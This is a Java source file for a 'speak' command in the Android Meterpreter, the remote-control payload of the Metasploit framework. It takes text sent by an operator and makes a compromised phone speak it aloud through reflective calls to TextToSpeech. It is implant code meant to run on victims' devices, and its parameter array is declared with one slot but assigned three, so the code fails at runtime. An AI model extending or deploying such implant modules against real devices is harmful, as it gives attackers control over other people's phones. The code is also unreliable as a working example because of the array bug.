package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.AndroidMeterpreter;

import java.lang.reflect.Method;
import java.lang.reflect.Constructor;
import java.util.HashMap;

public class speak implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SPEAK_TEXT = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9022);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String text = request.getStringValue(TLV_TYPE_SPEAK_TEXT);

        try {
            Class<?> TextToSpeech = Class.forName("android.speech.tts.TextToSpeech");
            Constructor[] allConstructors = TextToSpeech.getDeclaredConstructors();

            Constructor buildInstance = null;
            for (Constructor ctor : allConstructors) {
		Class<?>[] pType  = ctor.getParameterTypes();
                if (pType.length == 2) {
                    buildInstance = ctor;
                    break;
                }
            }

            Object tts = (Object)buildInstance.newInstance(AndroidMeterpreter.getContext(), null);

            Class[] params = new Class[1];
	    params[0] = String.class;
            params[1] = Integer.TYPE;
            params[2] = HashMap.class;

            Method speakMethod = TextToSpeech.getDeclaredMethod("speak", params);
            speakMethod.invoke(tts, text, 1, null);
        } catch (Exception e) {
            return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }

}
